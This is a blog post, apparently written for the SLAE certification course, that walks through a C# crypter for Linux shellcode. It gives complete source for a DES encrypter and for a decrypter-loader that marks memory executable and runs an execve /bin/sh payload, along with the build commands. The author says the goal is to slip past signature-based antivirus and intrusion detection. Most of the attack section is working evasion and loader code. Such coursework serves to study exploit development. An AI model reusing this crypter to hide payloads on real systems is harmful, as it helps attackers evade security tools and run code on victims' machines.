@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>    High-level language shellcode encryption on Linux (SLAE, Assignment #7)
+</title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="http://www.wryway.com/theme/css/cid.css">
+        <link href="http://www.wryway.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Security Nomad Atom Feed" />
+        
+ 
+        <link rel="apple-touch-icon" sizes="57x57" href="/icons/apple-touch-icon-57x57.png">
+        <link rel="apple-touch-icon" sizes="60x60" href="/icons/apple-touch-icon-60x60.png">
+        <link rel="apple-touch-icon" sizes="72x72" href="/icons/apple-touch-icon-72x72.png">
+        <link rel="apple-touch-icon" sizes="76x76" href="/icons/apple-touch-icon-76x76.png">
+        <link rel="apple-touch-icon" sizes="114x114" href="/icons/apple-touch-icon-114x114.png">
+        <link rel="apple-touch-icon" sizes="120x120" href="/icons/apple-touch-icon-120x120.png">
+        <link rel="apple-touch-icon" sizes="144x144" href="/icons/apple-touch-icon-144x144.png">
+        <link rel="apple-touch-icon" sizes="152x152" href="/icons/apple-touch-icon-152x152.png">
+        <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon-180x180.png">
+        <link rel="icon" type="image/png" href="/icons/favicon-32x32.png" sizes="32x32">
+        <link rel="icon" type="image/png" href="/icons/favicon-194x194.png" sizes="194x194">
+        <link rel="icon" type="image/png" href="/icons/favicon-96x96.png" sizes="96x96">
+        <link rel="icon" type="image/png" href="/icons/android-chrome-192x192.png" sizes="192x192">
+        <link rel="icon" type="image/png" href="/icons/favicon-16x16.png" sizes="16x16">
+        <link rel="manifest" href="/icons/manifest.json">
+        <link rel="shortcut icon" href="/icons/favicon.ico">
+        <meta name="msapplication-TileColor" content="#ffffff">
+        <meta name="msapplication-TileImage" content="/icons/mstile-144x144.png">
+        <meta name="msapplication-config" content="/icons/browserconfig.xml">
+        <meta name="theme-color" content="#ffffff">
+    </head>
+    <body>
+        <!--[if lt IE 7]>
+            <p class="chromeframe">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chromeframe/?redirect=true">activate Google Chrome Frame</a> to improve your experience.</p>
+        <![endif]-->
+
+            <div class="container">
+
+<header class="blog-header">
+    <h1><a href="http://www.wryway.com/blog/">Security Nomad</a></h1>
+    <p> Wandering the cyber security realm </p>
+    <nav>
+        <a href="http://www.wryway.com/categories/">CATEGORIES</a>
+        <a href="http://www.wryway.com/tags/">TAGS</a>
+        <a href="http://www.wryway.com/archives/">ARCHIVES</a>
+    </nav>
+</header>
+
+    <div class="post">
+
+        <header>
+            <h1>High-level language shellcode encryption on Linux (SLAE, Assignment #7)</h1>
+            <p class="category">
+                Category: <a class="category" href="http://www.wryway.com/category/exploit-development/"><b>Exploit Development</b></a>
+            </p>
+            <p class="date">
+                Written on <time datetime="2015-10-12T14:00:00-04:00">Oct 12, 2015</time>
+            </p>
+        </header>
+
+        <article>
+            <p>This post is similar to the <a href="/blog/assembly-custom-encoding-scheme/">custom encoding</a> one I wrote earlier. In this post we will transform the shellcode by means of higher-level programming language. But instead of encoding this time we will employ encryption.</p>
+<p>We all know that inventing your own cryptography algorithm, especially if you aren't Nobel laureate in cryptography, is a bad idea. Though when the goal is to trick a signature-based anti-virus or intrusion detection system, I would argue that this is not the case. Anyway to not complicate things and clearly demonstrate the encryption approach I decided to go with the .NET implementation of the DES algorithm.</p>
+<p>My language of choice for this assignment is C#. If you don't know how to <a href="/blog/shellcode-in-csharp-on-linux/">execute x86 Linux shellcode from C# application</a>, please, check the link. The solution consists of two programs. The first one is used to encrypt the given shellcode and the second one - to decrypt and run it. The decrypter part is based on the C# shellcode execution frame from the aforementioned post.</p>
+<p>First comes the source code of the encrypter:</p>
+<div class="highlight"><pre><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Security.Cryptography</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span>
+
+<span class="k">class</span> <span class="nc">MainClass</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="k">static</span> <span class="n">String</span> <span class="n">shellcodeStr</span> <span class="p">=</span> <span class="s">&quot;\x31\xc9\xf7\xe1\x51\x68\x6e\x2f\x73\x68&quot;</span> <span class="p">+</span>
+        <span class="s">&quot;\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80&quot;</span><span class="p">;</span>
+    <span class="k">private</span> <span class="k">static</span> <span class="n">Byte</span><span class="p">[]</span> <span class="n">key</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Byte</span><span class="p">[</span><span class="m">8</span><span class="p">]</span> <span class="p">{</span><span class="m">1</span><span class="p">,</span> <span class="m">2</span><span class="p">,</span> <span class="m">3</span><span class="p">,</span> <span class="m">4</span><span class="p">,</span> <span class="m">5</span><span class="p">,</span> <span class="m">6</span><span class="p">,</span> <span class="m">7</span><span class="p">,</span> <span class="m">8</span><span class="p">};</span>
+    <span class="k">private</span> <span class="k">static</span> <span class="n">Byte</span><span class="p">[]</span> <span class="n">iv</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Byte</span><span class="p">[</span><span class="m">8</span><span class="p">]</span> <span class="p">{</span><span class="m">1</span><span class="p">,</span> <span class="m">2</span><span class="p">,</span> <span class="m">3</span><span class="p">,</span> <span class="m">4</span><span class="p">,</span> <span class="m">5</span><span class="p">,</span> <span class="m">6</span><span class="p">,</span> <span class="m">7</span><span class="p">,</span> <span class="m">8</span><span class="p">};</span>
+
+
+    <span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">Byte</span><span class="p">[]</span> <span class="n">shellcodeBytes</span> <span class="p">=</span> <span class="n">ToShellcodeBytes</span><span class="p">(</span><span class="n">shellcodeStr</span><span class="p">);</span>
+        <span class="n">Byte</span><span class="p">[]</span> <span class="n">shellcodeBytesEncrypted</span> <span class="p">=</span> <span class="n">Crypt</span><span class="p">(</span><span class="n">shellcodeBytes</span><span class="p">);</span>
+        <span class="n">String</span> <span class="n">shellcodeStrEncrypted</span> <span class="p">=</span> <span class="n">ToShellcodeString</span><span class="p">(</span><span class="n">shellcodeBytesEncrypted</span><span class="p">);</span>
+        <span class="n">Byte</span><span class="p">[]</span> <span class="n">shellcodeBytesDecrypted</span> <span class="p">=</span> <span class="n">Decrypt</span><span class="p">(</span><span class="n">shellcodeBytesEncrypted</span><span class="p">);</span>
+        <span class="n">String</span> <span class="n">shellcodeStrDecrypted</span> <span class="p">=</span> <span class="n">ToShellcodeString</span><span class="p">(</span><span class="n">shellcodeBytesDecrypted</span><span class="p">);</span>
+
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span>
+            <span class="s">&quot;Original Shellcode ({0} bytes): {1}\n&quot;</span><span class="p">,</span> 
+            <span class="n">shellcodeStr</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> 
+            <span class="n">ToShellcodeString</span><span class="p">(</span><span class="n">ToShellcodeBytes</span><span class="p">(</span><span class="n">shellcodeStr</span><span class="p">)));</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span>
+            <span class="s">&quot;Encrypted Shellcode ({0} bytes): {1}\n&quot;</span><span class="p">,</span> 
+            <span class="n">shellcodeBytesEncrypted</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span>
+            <span class="n">shellcodeStrEncrypted</span><span class="p">);</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span>
+            <span class="s">&quot;Decrypted Shellcode ({0} bytes): {1}\n&quot;</span><span class="p">,</span> 
+            <span class="n">shellcodeBytesDecrypted</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span>
+            <span class="n">shellcodeStrDecrypted</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">shellcodeBytes</span><span class="p">.</span><span class="n">SequenceEqual</span><span class="p">(</span><span class="n">shellcodeBytesDecrypted</span><span class="p">))</span> 
+        <span class="p">{</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Success: Original and Decrypted shelcodes match.&quot;</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span> 
+        <span class="p">{</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Fail: Original and Decrypted shellcodes do NOT match!&quot;</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">static</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nf">Crypt</span><span class="p">(</span><span class="n">Byte</span><span class="p">[]</span> <span class="n">inputBuffer</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">SymmetricAlgorithm</span> <span class="n">algorithm</span> <span class="p">=</span> <span class="n">DES</span><span class="p">.</span><span class="n">Create</span><span class="p">();</span>
+        <span class="n">ICryptoTransform</span> <span class="n">transform</span> <span class="p">=</span> <span class="n">algorithm</span><span class="p">.</span><span class="n">CreateEncryptor</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">);</span>
+        <span class="n">Byte</span><span class="p">[]</span> <span class="n">outputBuffer</span> <span class="p">=</span> 
+            <span class="n">transform</span><span class="p">.</span><span class="n">TransformFinalBlock</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">outputBuffer</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">static</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nf">Decrypt</span><span class="p">(</span><span class="n">Byte</span><span class="p">[]</span> <span class="n">inputBuffer</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">SymmetricAlgorithm</span> <span class="n">algorithm</span> <span class="p">=</span> <span class="n">DES</span><span class="p">.</span><span class="n">Create</span><span class="p">();</span>
+        <span class="n">ICryptoTransform</span> <span class="n">transform</span> <span class="p">=</span> <span class="n">algorithm</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">);</span>
+        <span class="n">Byte</span><span class="p">[]</span> <span class="n">outputBuffer</span> <span class="p">=</span> 
+            <span class="n">transform</span><span class="p">.</span><span class="n">TransformFinalBlock</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+
+        <span class="k">return</span> <span class="n">outputBuffer</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">static</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nf">ToShellcodeBytes</span><span class="p">(</span><span class="n">String</span> <span class="n">shellcode</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">Byte</span><span class="p">[]</span> <span class="n">sc_bytes</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Byte</span><span class="p">[</span><span class="n">shellcode</span><span class="p">.</span><span class="n">Length</span><span class="p">];</span>
+        <span class="k">for</span> <span class="p">(</span><span class="n">Int32</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span> 
+        <span class="p">{</span>
+            <span class="n">sc_bytes</span> <span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="n">Byte</span><span class="p">)</span> <span class="n">shellcode</span> <span class="p">[</span><span class="n">i</span><span class="p">];</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="n">sc_bytes</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">static</span> <span class="n">String</span> <span class="nf">ToShellcodeString</span><span class="p">(</span><span class="n">Byte</span><span class="p">[]</span> <span class="n">shellcodeBytes</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">StringBuilder</span> <span class="n">shellcodeStr</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StringBuilder</span> <span class="p">();</span>
+
+        <span class="k">for</span> <span class="p">(</span><span class="n">Int32</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">shellcodeBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span> 
+        <span class="p">{</span>
+            <span class="n">shellcodeStr</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="s">&quot;\\x&quot;</span><span class="p">);</span>
+            <span class="n">shellcodeStr</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="n">shellcodeBytes</span> <span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ToString</span><span class="p">(</span><span class="s">&quot;X2&quot;</span><span class="p">));</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="n">shellcodeStr</span><span class="p">.</span><span class="n">ToString</span><span class="p">();</span>
+    <span class="p">}</span>
+
+
+<span class="p">}</span>
+</pre></div>
+
+
+<p>The shellcode string, initial vector value and the encryption key are all hard-coded into the source. I know that using hard-coded keys and initial vectors is generally a very bad idea, but remember that we are just fooling signature-based software here, not a human analyst. The shellcode used starts the <code>/bin/sh</code> shell.</p>
+<p>After compiling and running the above source code </p>
+<div class="highlight"><pre>mcs encrypter.cs <span class="o">&amp;&amp;</span> ./encrypter.exe
+</pre></div>
+
+
+<p>we will get an output with original, encrypted, and decrypted shellcode strings. The output will also contain a comparison result of the original and decrypted shellcode strings:</p>
+<p><img alt="Running shellcode encrypter" src="http://www.wryway.com/blog/high-level-language-shellcode-encryption-on-linux/running-shellcode-encrypter.png" title="Running shellcode encrypter" />
+<div class="img-caption">Running shellcode encrypter</div></p>
+<p>Note that the size of the encrypted strings increased by 3 bytes. This fact may or may not be an issue while writing an exploit for a particular program. If it becomes an issue some alternative encryption algorithm that does not increase the payload size should be chosen.</p>
+<p>The encrypted string from the encrypter's output, along with the same IV and key, is pated into decrypter source code:</p>
+<div class="highlight"><pre><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">Mono.Unix.Native</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Security.Cryptography</span><span class="p">;</span>
+
+<span class="k">class</span> <span class="nc">MainClass</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="k">static</span> <span class="n">String</span> <span class="n">shellcodeStrEncrypted</span> <span class="p">=</span> <span class="s">&quot;\x92\x23\xAD\xAF\x0F\x87\xF0&quot;</span>
+        <span class="p">+</span> <span class="s">&quot;\x43\x93\xDA\x66\x62\xC4\x98\x2C\xFE\x33\x25\x89\x35\x1C\xC2\xB7\xD1&quot;</span><span class="p">;</span>
+    <span class="k">private</span> <span class="k">static</span> <span class="n">Byte</span><span class="p">[]</span> <span class="n">key</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Byte</span><span class="p">[</span><span class="m">8</span><span class="p">]</span> <span class="p">{</span><span class="m">1</span><span class="p">,</span> <span class="m">2</span><span class="p">,</span> <span class="m">3</span><span class="p">,</span> <span class="m">4</span><span class="p">,</span> <span class="m">5</span><span class="p">,</span> <span class="m">6</span><span class="p">,</span> <span class="m">7</span><span class="p">,</span> <span class="m">8</span><span class="p">};</span>
+    <span class="k">private</span> <span class="k">static</span> <span class="n">Byte</span><span class="p">[]</span> <span class="n">iv</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Byte</span><span class="p">[</span><span class="m">8</span><span class="p">]</span> <span class="p">{</span><span class="m">1</span><span class="p">,</span> <span class="m">2</span><span class="p">,</span> <span class="m">3</span><span class="p">,</span> <span class="m">4</span><span class="p">,</span> <span class="m">5</span><span class="p">,</span> <span class="m">6</span><span class="p">,</span> <span class="m">7</span><span class="p">,</span> <span class="m">8</span><span class="p">};</span>
+
+    <span class="k">private</span> <span class="k">static</span> <span class="n">Int32</span> <span class="n">PAGE_SIZE</span> <span class="p">=</span> 
+        <span class="p">(</span><span class="n">Int32</span><span class="p">)</span><span class="n">Mono</span><span class="p">.</span><span class="n">Unix</span><span class="p">.</span><span class="n">Native</span><span class="p">.</span><span class="n">Syscall</span><span class="p">.</span><span class="n">sysconf</span><span class="p">(</span><span class="n">SysconfName</span><span class="p">.</span><span class="n">_SC_PAGESIZE</span><span class="p">);</span>
+
+    <span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">Byte</span><span class="p">[]</span> <span class="n">shellcodeBytesEncrypted</span> <span class="p">=</span> <span class="n">ToShellcodeBytes</span><span class="p">(</span><span class="n">shellcodeStrEncrypted</span><span class="p">);</span>
+        <span class="n">Byte</span><span class="p">[]</span> <span class="n">shellcodeBytesDecrypted</span> <span class="p">=</span> <span class="n">Decrypt</span><span class="p">(</span><span class="n">shellcodeBytesEncrypted</span><span class="p">);</span>
+
+        <span class="n">ExecShellcode</span><span class="p">(</span><span class="n">shellcodeBytesDecrypted</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">static</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nf">ToShellcodeBytes</span><span class="p">(</span><span class="n">String</span> <span class="n">shellcode</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">Byte</span><span class="p">[]</span> <span class="n">sc_bytes</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Byte</span><span class="p">[</span><span class="n">shellcode</span><span class="p">.</span><span class="n">Length</span><span class="p">];</span>
+        <span class="k">for</span> <span class="p">(</span><span class="n">Int32</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span> 
+        <span class="p">{</span>
+            <span class="n">sc_bytes</span> <span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="n">Byte</span><span class="p">)</span> <span class="n">shellcode</span> <span class="p">[</span><span class="n">i</span><span class="p">];</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="n">sc_bytes</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">static</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nf">Decrypt</span><span class="p">(</span><span class="n">Byte</span><span class="p">[]</span> <span class="n">inputBuffer</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">SymmetricAlgorithm</span> <span class="n">algorithm</span> <span class="p">=</span> <span class="n">DES</span><span class="p">.</span><span class="n">Create</span><span class="p">();</span>
+        <span class="n">ICryptoTransform</span> <span class="n">transform</span> <span class="p">=</span> <span class="n">algorithm</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">);</span>
+        <span class="n">Byte</span><span class="p">[]</span> <span class="n">outputBuffer</span> <span class="p">=</span> 
+            <span class="n">transform</span><span class="p">.</span><span class="n">TransformFinalBlock</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+
+        <span class="k">return</span> <span class="n">outputBuffer</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">static</span> <span class="n">IntPtr</span> <span class="nf">GetPageBaseAddress</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">p</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)((</span><span class="n">Int32</span><span class="p">)</span><span class="n">p</span> <span class="p">&amp;</span> <span class="p">~(</span><span class="n">PAGE_SIZE</span> <span class="p">-</span> <span class="m">1</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">MakeMemoryExecutable</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">pagePtr</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="kt">var</span> <span class="n">mprotectResult</span> <span class="p">=</span> <span class="n">Syscall</span><span class="p">.</span><span class="n">mprotect</span> <span class="p">(</span><span class="n">pagePtr</span><span class="p">,</span> <span class="p">(</span><span class="kt">ulong</span><span class="p">)</span><span class="n">PAGE_SIZE</span><span class="p">,</span> 
+            <span class="n">MmapProts</span><span class="p">.</span><span class="n">PROT_EXEC</span> <span class="p">|</span> <span class="n">MmapProts</span><span class="p">.</span><span class="n">PROT_WRITE</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">mprotectResult</span> <span class="p">!=</span> <span class="m">0</span><span class="p">)</span> 
+        <span class="p">{</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span> <span class="p">(</span><span class="s">&quot;Error: mprotect failed to make page at 0x{0} &quot;</span> <span class="p">+</span>
+                <span class="s">&quot;address executable! Result: {1}, Errno: {2}&quot;</span><span class="p">,</span> <span class="n">mprotectResult</span><span class="p">,</span> 
+                <span class="n">Syscall</span><span class="p">.</span><span class="n">GetLastError</span> <span class="p">());</span>
+            <span class="n">Environment</span><span class="p">.</span><span class="n">Exit</span> <span class="p">(</span><span class="m">1</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">delegate</span> <span class="k">void</span> <span class="nf">ShellcodeFuncPrototype</span><span class="p">();</span>
+
+    <span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">ExecShellcode</span><span class="p">(</span><span class="n">Byte</span><span class="p">[]</span> <span class="n">shellcodeBytes</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="c1">// Prevent garbage collector from moving the shellcode byte array</span>
+        <span class="n">GCHandle</span> <span class="n">pinnedByteArray</span> <span class="p">=</span> <span class="n">GCHandle</span><span class="p">.</span><span class="n">Alloc</span><span class="p">(</span><span class="n">shellcodeBytes</span><span class="p">,</span> <span class="n">GCHandleType</span><span class="p">.</span><span class="n">Pinned</span><span class="p">);</span>
+
+        <span class="c1">// Get handle for shellcode address and address of the page it is located in</span>
+        <span class="n">IntPtr</span> <span class="n">shellcodePtr</span> <span class="p">=</span> <span class="n">pinnedByteArray</span><span class="p">.</span><span class="n">AddrOfPinnedObject</span><span class="p">();</span>
+        <span class="n">IntPtr</span> <span class="n">shellcodePagePtr</span> <span class="p">=</span> <span class="n">GetPageBaseAddress</span><span class="p">(</span><span class="n">shellcodePtr</span><span class="p">);</span>
+        <span class="n">Int32</span> <span class="n">shellcodeOffset</span> <span class="p">=</span> <span class="p">(</span><span class="n">Int32</span><span class="p">)</span><span class="n">shellcodePtr</span> <span class="p">-</span> <span class="p">(</span><span class="n">Int32</span><span class="p">)</span><span class="n">shellcodePagePtr</span><span class="p">;</span>
+        <span class="n">Int32</span> <span class="n">shellcodeLen</span> <span class="p">=</span> <span class="n">shellcodeBytes</span><span class="p">.</span><span class="n">GetLength</span> <span class="p">(</span><span class="m">0</span><span class="p">);</span>
+
+        <span class="c1">// Some debugging information</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span> <span class="p">(</span><span class="s">&quot;Page Size: {0}&quot;</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">.</span><span class="n">ToString</span> <span class="p">());</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span> <span class="p">(</span><span class="s">&quot;Shellcode address: 0x{0}&quot;</span><span class="p">,</span> <span class="n">shellcodePtr</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="s">&quot;x&quot;</span><span class="p">));</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span> <span class="p">(</span><span class="s">&quot;First page start address: 0x{0}&quot;</span><span class="p">,</span> 
+            <span class="n">shellcodePagePtr</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="s">&quot;x&quot;</span><span class="p">));</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span> <span class="p">(</span><span class="s">&quot;Shellcode offset: {0}&quot;</span><span class="p">,</span> <span class="n">shellcodeOffset</span><span class="p">);</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span> <span class="p">(</span><span class="s">&quot;Shellcode length: {0}&quot;</span><span class="p">,</span> <span class="n">shellcodeLen</span><span class="p">);</span>
+
+        <span class="c1">// Make shellcode memory executable</span>
+        <span class="n">MakeMemoryExecutable</span><span class="p">(</span><span class="n">shellcodePagePtr</span><span class="p">);</span>
+
+        <span class="c1">// Check if shellcode spans across more than 1 page; make all extra pages</span>
+        <span class="c1">// executable too</span>
+        <span class="n">Int32</span> <span class="n">pageCounter</span> <span class="p">=</span> <span class="m">1</span><span class="p">;</span>
+        <span class="k">while</span> <span class="p">(</span><span class="n">shellcodeOffset</span> <span class="p">+</span> <span class="n">shellcodeLen</span> <span class="p">&gt;</span> <span class="n">PAGE_SIZE</span><span class="p">)</span> 
+        <span class="p">{</span>
+            <span class="n">shellcodePagePtr</span> <span class="p">=</span> 
+                <span class="n">GetPageBaseAddress</span><span class="p">(</span><span class="n">shellcodePtr</span> <span class="p">+</span> <span class="n">pageCounter</span> <span class="p">*</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>
+            <span class="n">pageCounter</span><span class="p">++;</span>
+            <span class="n">shellcodeLen</span> <span class="p">-=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
+
+            <span class="n">MakeMemoryExecutable</span><span class="p">(</span><span class="n">shellcodePagePtr</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// Debug information</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span> <span class="p">(</span><span class="s">&quot;Pages taken by the shellcode: {0}&quot;</span><span class="p">,</span>
+            <span class="n">pageCounter</span><span class="p">);</span>
+
+        <span class="c1">// Make shellcode callable by converting pointer to delegate</span>
+        <span class="n">ShellcodeFuncPrototype</span> <span class="n">shellcode_func</span> <span class="p">=</span> 
+            <span class="p">(</span><span class="n">ShellcodeFuncPrototype</span><span class="p">)</span> <span class="n">Marshal</span><span class="p">.</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">(</span>
+                <span class="n">shellcodePtr</span><span class="p">,</span> <span class="k">typeof</span><span class="p">(</span><span class="n">ShellcodeFuncPrototype</span><span class="p">));</span>
+
+        <span class="n">shellcode_func</span><span class="p">();</span> <span class="c1">// Execute shellcode</span>
+
+        <span class="n">pinnedByteArray</span><span class="p">.</span><span class="n">Free</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>After compiling and running the decrypter</p>
+<div class="highlight"><pre>mcs -reference:Mono.Posix decrypter.cs <span class="o">&amp;&amp;</span> ./decrypter.exe
+</pre></div>
+
+
+<p>we should get output similar to the show on the following print screen:</p>
+<p><img alt="Running shellcode decrypter" src="http://www.wryway.com/blog/high-level-language-shellcode-encryption-on-linux/running-shellcode-decrypter.png" title="Running shellcode decrypter" />
+<div class="img-caption">Running shellcode decrypter</div></p>
+<p>As we can see everything worked out as expected.</p>
+<div class="divider"></div>
+
+<div class="divider"></div>
+
+<div class="divider"></div>
+
+<div class="divider"></div>
+
+<p><hr>
+This blog post was created to fulfill the requirements of the <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert</a> certification. Student id: SLAE-685.</p>
+<p>The source files created while completing the assignment can be found in my <a href="https://github.com/reider-roque/slae">GitHub repository</a>.</p>
+        </article>
+
+        <footer>
+            <p>
+                Tags:  
+ 
+                    <a class="tag" href="/tag/slae/">SLAE</a>
+ 
+                    <a class="tag" href="/tag/c-sharp/">C-Sharp</a>
+ 
+                    <a class="tag" href="/tag/linux/">Linux</a>
+            </p>
+        </footer>
+
+<div class="comments">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'wryway';
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
